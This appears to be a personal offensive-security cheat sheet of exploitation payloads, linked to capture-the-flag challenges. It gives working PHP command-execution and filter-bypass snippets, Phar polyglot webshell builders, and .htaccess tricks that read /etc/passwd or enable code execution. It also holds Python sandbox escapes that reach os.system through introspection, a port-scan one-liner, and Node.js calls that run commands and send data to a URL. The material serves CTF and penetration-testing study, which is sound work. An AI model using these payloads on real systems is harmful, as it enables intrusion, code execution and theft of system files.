# Exploitation Payloads

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is the way to go, but I noted down some of mine.

<hr class="sep-both">

## Shell

<div class="row row-cols-lg-2"><div>

#### Shell ‚Äî Blind PoC

To see if your code is executed in a (semi) blind context:

```ps
$ ping -c 1 HOST_IP # execute by target
$ sudo tcpdump -i tun0 icmp # see if you got ping
```
</div><div>
</div></div>

<hr class="sep-both">

## PHP

<div class="row row-cols-lg-2"><div>

#### PHP ‚Äî POC

We often run `phpinfo` to get information.

```php!
<?php phpinfo() ?>
```

We may also want some additional information:

```php!
<?php echo "Current directory: " . getcwd(); ?>
```

<br>

#### PHP ‚Äî Execute Shell Commands

Refer to [webshells#php](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md#php-web-shell). Special mention to the `passthru` function as it can be called without `echo` while still displaying the results.

<br>

#### PHP ‚Äî Directory Listing

A few different ways to achieve the same output. If you cannot use a loop, simply print the array values one by one using `$xxx[0]`, etc.

```php!
<?php
var_dump(scandir("."));

$files = scandir(".");
foreach ($files as $file) { echo $file; }

$dir=dir('.');
while ($f = $dir->read()) { echo $f; }

$dir = opendir(".");
while($f = readdir($dir)) { echo $f; }
```

<br>

#### PHP ‚Äî Read a file

There are multiple functions you might use:

```php!
<?php
$fileContents = file_get_contents('index.php');
$fileContents = show_source('index.php', true);
$fileContents = highlight_file('index.php', true);
$fileContents = readfile('index.php');
echo $fileContents;
?>
```

Base64 encoding is not always necessary, especially with `show_source`.

```php!
$fileContents = base64_encode($fileContents);
```

<br>

#### PHP ‚Äî Write a file

There are multiple functions you might use:

```php!
file_put_contents('/tmp/poc', base64_decode('...')); 
```

You may have to change the permissions:

```php!
chmod('/tmp/poc', 0777);
```
</div><div>

#### PHP ‚Äî Catch Requests

Decode `zlib` compressed and `base64` encoded payload.

```php!
$p=str_replace(" ", "+", $_GET['p']);
$r=zlib_decode(base64_decode($p));
file_put_contents('requests.txt', "Request:\n$r\n", FILE_APPEND | LOCK_EX);
```

```php!
$f = fopen('requests.txt', 'a');
fwrite($f, $_GET['p'] . "\n");
fclose($f);
```

```php!
if ($_SERVER["REQUEST_METHOD"] === "POST") {} // ...
```

<br>

#### PHP ‚Äî Obfuscation

[![php_eval](../../../../_badges/rootme/web_server/php_eval.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval)
[![php_eval_advanced_filters_bypass](../../../../_badges/rootme/web_server/php_eval_advanced_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval-Advanced-filters-bypass)

We may have to create innovative payloads due to input being filtered. PHP doesn't much room for that. 

* **PHP String Function Names**

```php!
'var_dump'('5');
('var'.'_dump')('5');
$f = 'var'.'_dump'; $f('5');
```

* **PHP Octal Strings**

You can copy-paste and use this [Python Code]() to get octal representation of your PHP code.

```py
print(_php_octal('(system)("whoami")'))
# Output: ("\163\171\163\164\145\155")("\167\150\157\141\155\151")
# Alternative: $f = "\163\171\163\164\145\155"; $f("\167\150\157\141\155\151");
```

‚ö†Ô∏è Firstly, function name must be wrapped in parentheses or stored in a variable. Secondly, it only works with **double quotes**.

* **PHP Introspection**, such as to avoid using `$`

```php!
var_dump(get_declared_classes());     // ex: for insecure deserialization
var_dump(get_declared_interfaces());  // ex: for insecure deserialization
var_dump(get_declared_traits());      // ex: for insecure deserialization
var_dump(get_defined_functions());    // ex: for insecure deserialization
var_dump(get_defined_vars());         // ex: can access vars using a string, 
                                      // e.g. get_defined_vars()['_SERVER'] instead of $_SERVER
var_dump(get_defined_constants());    // ex: can access constants using a string
var_dump(apache_getenv('SECRET')); // same as $_SERVER['SECRET']
```

<br>

#### PHP ‚Äî Random

Utilities

```php!
putenv('LD_PRELOAD=/path/to/xxx.so');
call_user_func('function_name', 'arg1');
```
</div></div>

<hr class="sep-both">

## Phar

[![file_upload_polyglot](../../../../_badges/rootme/web_server/file_upload_polyglot.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)

<div class="row row-cols-lg-2"><div>

Simply zipping the PHP may work. Otherwise, you can use:

```php!
<?php // Run 'php --define phar.readonly=0 gen.php'
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
// or: $phar->addFile('shell.php', 'shell.php');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

‚û°Ô∏è `shell.php` is the file inside the archive.
</div><div>

To create a **Polyglot Phar** <small>(Ex: JPG with \xff\xd8 and \xff\xd9)</small>

```php!
<?php // php --define phar.readonly=0 gen.php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
$phar->setStub("\xff\xd8\xff\xd9\n<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();
```

üìö For reference, `include 'phar://./shell.phar/shell.php';`
</div></div>

<hr class="sep-both">

## .htaccess

<div class="row row-cols-lg-2"><div>

htaccess files may be exploited to perform multiple attacks such as:

* üóÉÔ∏è Server Information Disclosure
* üó∫Ô∏è Source Code Disclosure
* üìö File Reading
* üé£ Open Redirect
* ü§ñ Remote Code Execution
* ...

#### htaccess ‚Äî Server Information Disclosure

[![php_apache_configuration](../../../../_badges/rootme/web_server/php_apache_configuration.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Apache-configuration)

These handler can expose sensitive information about the server.

```apacheconf!
SetHandler server-info
SetHandler server-status # Last URLs fetched, PIDs, Version, VHost
```
</div><div>

#### htaccess ‚Äî File Reading

[![php_apache_configuration](../../../../_badges/rootme/web_server/php_apache_configuration.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Apache-configuration)

If `mod_layout` is present, you can append a file to any request.

```apacheconf!
AddOutputFilter LAYOUT .htaccess
<IfModule mod_layout.c>
	LayoutFooter /etc/passwd
</IfModule>
```

ErrorDocument is always available and can be used to read files:

```apacheconf!
ErrorDocument 404 %{file:/etc/passwd}
```

#### htaccess ‚Äî Remote Code Execution

[![php_apache_configuration](../../../../_badges/rootme/web_server/php_apache_configuration.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Apache-configuration)

If PHP is available, you can execute code:

```apacheconf!
php_flag engine on
SetHandler application/x-httpd-php
SetHandler application/x-httpd-php .jpg
```

Not tested, but SSI may be possible too:

```apacheconf!
AddType text/html .xxx
AddHandler server-parsed .xxx
```
</div></div>

<hr class="sep-both">

## Python

<div class="row row-cols-lg-2"><div>

#### Python ‚Äî Execute Shell Commands

Simple python code to run a command.

```py
import os;os.system('ls -1a');
import os;os.popen("ls -1a").read();
import subprocess; subprocess.run(['ls', '-1a']);
import subprocess;print(subprocess.run("whoami", shell=True, stdout=subprocess.PIPE, text=True).stdout)
```

<br>

#### Python ‚Äî Obfuscation

A few utilities to bypass filters:

* `chr(i)` such as `chr(46)` for `.`

```py
','.join([f'ch({ord(c)})' for c in 'whoami'])
```

* Alternative characters: `gloÔΩÇals()`, `ùò¶ùòπùò¶ùò§`, `ùôöùìçùìÆùò§`
* Alternative characters: [ItalicTextGenerator](https://lingojam.com/ItalicTextGenerator)

<br>

#### Python ‚Äî Utilities

For base64 + URL encoding: `base64.urlsafe_b64encode(payload)`.

<br>

#### Python ‚Äî Filter Bypass

[![python_jail_exec](../../../../_badges/rootme/app_script/python_jail_exec.svg)](https://www.root-me.org/en/Challenges/App-Script/Python-Jail-Exec)

Aside from `(` and `)`, there are always one or two alternative syntaxes to perform the same action in Python, often resulting in larger payloads.

Replace is only called once, so you can just anticipate and add one more char. Strip only remove the leading/trailing chars.

```py
def foo():
    pass

class Bar:
    def __init__(self):
        self.dummy = 42

bar = Bar()
```

```py
# Object properties can be accessed with __dict__, '.', and 'getattr'
print(bar.dummy)
print(getattr(bar, 'dummy'))
print(bar.__dict__['dummy'])
print(bar.__getattribute__('dummy'))
# Function properties can be accessed with '.' and 'getattr'
print(foo.__globals__)
print(getattr(foo, '__globals__'))
print(foo.__getattribute__('__globals__'))
```

```py
# Many attributes, such as __globals__ or __dict__ are dict()
# We can access their values using multiple syntaxes
x = {'flag': 'value'}
flag = x['flag']
flag = x[list(x)[0]]
flag = x.get('flag')
```

```py
# There are multiple paths to __globals__
# Which contains imported modules and builtins
#
# When accessing the __globals__ of an element inside another
# module, you can access the modules they imported (os, etc.)
lglobals = globals()
lglobals = foo.__globals__
lglobals = bar.__init__.__globals__
lglobals = bar.__init__.func_globals # Python 2
```

```py
# Builtins can be used to import modules
lbuiltins =__builtins__
lbuiltins = foo.__builtins__
lbuiltins = lglobals['__builtins__'] # lglobals is a dict()

os = __import__('os')
os = lbuiltins.__import__('os')
os = lglobals['os'] # if imported in the global context
```

```py
# There are multiple ways to achieve the same thing
os.system('whoami')
os.system.__call__('whoami')
os.system.__call__(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))
os.system.__call__(str().join([chr(119),chr(104),chr(111),chr(97),chr(109),chr(105)]))
os.__dict__['system']('whoami')
getattr(os, 'system')('whoami')
```

```py
# Python supports unicode characters in strings
print(f"\\u{ord('s'):04x}") # output: \u0073
print("\u0073")             # output: s

import importlib; b64 = importlib.import_module("\u0062\u0061\u0073\u006564") # base64
```
</div><div>

#### Python Programs (Inliners)

Alternative to `ip a` in Python:

```shell!
$ python3 -c 'import socket, fcntl, struct; sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); get_ip = lambda interface: socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915, struct.pack("256s", bytes(interface[:15], "utf-8")))[20:24]); interfaces = [(i[1], get_ip(i[1])) for i in socket.if_nameindex()]; print(interfaces)'
```

TCP Port Scan in Python:

```shell!
$ python3 -c 'import socket; host = "127.0.0.1"; open_ports = [port for port in range(1, 65535) if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((host, port)) == 0]; print(open_ports if open_ports else "No open ports found on {}.".format(host))'
```

<br>

#### Python ‚Äî  Deep Introspection

[![python_jail_exec](../../../../_badges/rootme/app_script/python_jail_exec.svg)](https://www.root-me.org/en/Challenges/App-Script/Python-Jail-Exec)

Abusing introspection, we may be able to access any **imported** class and maybe import new ones too. It's complex as indexes are not fixed.

```yaml!
Find: [aclass.__name__ for aclass in current_parent].index('current_class_you_are_looking_for')
Example: [aclass.__name__ for aclass in ().__class__.__base__.__subclasses__()].index('_IOBase')
Example: [aclass.__name__ for aclass in ().__class__.mro()[-1].__subclasses__()].index('_IOBase')
Python 2.7: { file = 40, catch_warnings = 59 }
Python 3.5: { _IOBase = 96, _RawIOBase = 0, FileIO = 0, Popen = -1 }
Python 3.10: { _IOBase = 111, _RawIOBase = 0, FileIO = 0, Popen = -1 }
Python 3.11.8: {_IOBase = 114, _RawIOBase = 1, FileIO = 0, Popen = -1 }
Python 3.11.9: {_IOBase = 115, _RawIOBase = 1, FileIO = 0, BlockFinder = 217, Popen = -1 }
```

A few commands to learn more about your environment:

```py
globals()     # global symbols (variables, functions)
locals()      # local symbols (function, method, block)
vars()        # without any argument, same as 'locals'
__builtins__.__dict__
import builtins; builtins.__dict__       # builtins
import keyword; print(keyword.kwlist)    # keywords
import string; print(string.punctuation) # symbols
local_builtins = ().__class__.__base__.__subclasses__()[59]()._module.__builtins__ # Python2
```

Access the open builtins function:

```py
open = __builtins__.__dict__['open']
open = ().__class__.__base__.__subclasses__()[40] # Python 2
open = ().__class__.__base__.__subclasses__()[114].__subclasses__()[1].__subclasses__()[0] # Python 3
```

Accessing the `os` module from another module import it:

```py
os = __builtins__.__dict__['__import__']('os')
os = ().__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].os  # Python2
os = ().__class__.__base__.__subclasses__()[217].__init__.__globals__['os']  # Python3
```

You can use this short snippet to find such modules:

```py
for i, aclass in enumerate(().__class__.__base__.__subclasses__()):
    if (not hasattr(aclass, '__init__') or not hasattr(aclass.__init__, '__globals__')
            or not aclass.__init__.__globals__):
        continue
    if 'os' in list(aclass.__init__.__globals__):
        print("Found at ", i)
```

<br>

#### Python ‚Äî Frame/Code Introspection

[![dissecting_python_objects](../../../../_badges/hacktricks/generic_methodologies_and_resources/python/bypass_python_sandboxes/dissecting_python_objects.svg)](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#dissecting-python-objects)
[![python_pyjail_1](../../../../_badges/rootme/app_script/python_pyjail_1.svg)](https://www.root-me.org/en/Challenges/App-Script/Python-PyJail-1)

You can use the [code or frame](https://docs.python.org/3/library/inspect.html) attribute for analysis.

```py
def secret(y = 5):
    """This code is secret"""
    flag = b'flag{you_found_me}'


def main():
    """Your code"""
    print(secret.__code__.co_consts)
    print(__import__('inspect').currentframe().f_globals['secret'].__code__.co_consts)

main()
```
```py
code = secret.__code__
code = secret.func_code # only in Python 2
code.co_consts   # ('This code is secret', b'flag{you_found_me}', None)
code.co_names    # ()
code.co_varnames # flag
code.co_cellvars # () | no external variables
```
</div></div>

<hr class="sep-both">

## Node.js

<div class="row row-cols-lg-2"><div>

#### Node.js ‚Äî Read Files

Read the source code of the main script:

```js!
require('fs').readFileSync(process.argv[1])
```

#### Node.js ‚Äî Execute Commands

You can use `execSync` or `exec` which is async and using a callback.

```js!
require('child_process').execSync('cat /etc/passwd')
```

#### Node.js ‚Äî HTTP Server

...

#### Node.js ‚Äî HTTP Requests

For get requests, we can use relatively short payloads:

```js!
require('http').get('URL?arg='+url_encoded_value);
```
</div><div>

#### Node.js ‚Äî Encoding/Decoding utilities

```js!
// Base64 Encode
const encodedData = Buffer.from(data).toString('base64');
const decodedData = Buffer.from(encodedData, 'base64').toString('utf-8');
// URL Encode
const urlEncodedString = encodeURIComponent(data);
```
</div></div>